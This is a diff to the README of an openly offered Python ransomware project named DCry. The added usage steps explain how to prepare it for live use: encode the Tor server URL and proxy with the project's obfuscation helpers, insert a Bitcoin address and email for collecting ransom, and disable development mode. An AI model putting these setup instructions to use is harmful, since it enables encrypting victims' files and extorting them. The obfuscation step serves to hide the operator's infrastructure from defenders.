@@ -11,10 +11,26 @@
 Ransomware using Python 💀💀💀
 
 ## Usage
+* Open the [`DCry.py`](./src/DCry.py) file.
+* Replace the `YOUR_URL` variable with the encoded URL using the `dx42` function like this:
+  ```python
+  YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()
+  ```
+  (Use the `ex42` function from the `edx42` module to encode your URL first.)
+  Example:
 
-* Open the [`DCry.py`](./src/DCRY.py) file, change the `YOUR_URL` variable to your Tor server URL, and set the `dev_mode` variable to `False`.
+  ```python
+  encoded_url = ex42(b"https://your-tor-server.onion")
+  YOUR_URL = dx42(encoded_url).decode()
+  ```
+* Replace the `YOUR_PROXY` variable similarly with your encoded proxy string:
+  ```python
+  YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()
+  ```
+* Replace `YOUR_BITCOIN_ADDRESS` with your actual Bitcoin address string.
+* Replace `YOUR_EMAIL_ADDRESS` with your actual email address string.
+* Set `dev_mode = False` to disable development mode.
 * Install the required packages with the following command:
-
   ```bash
   pip install -r requirements.txt
   ```
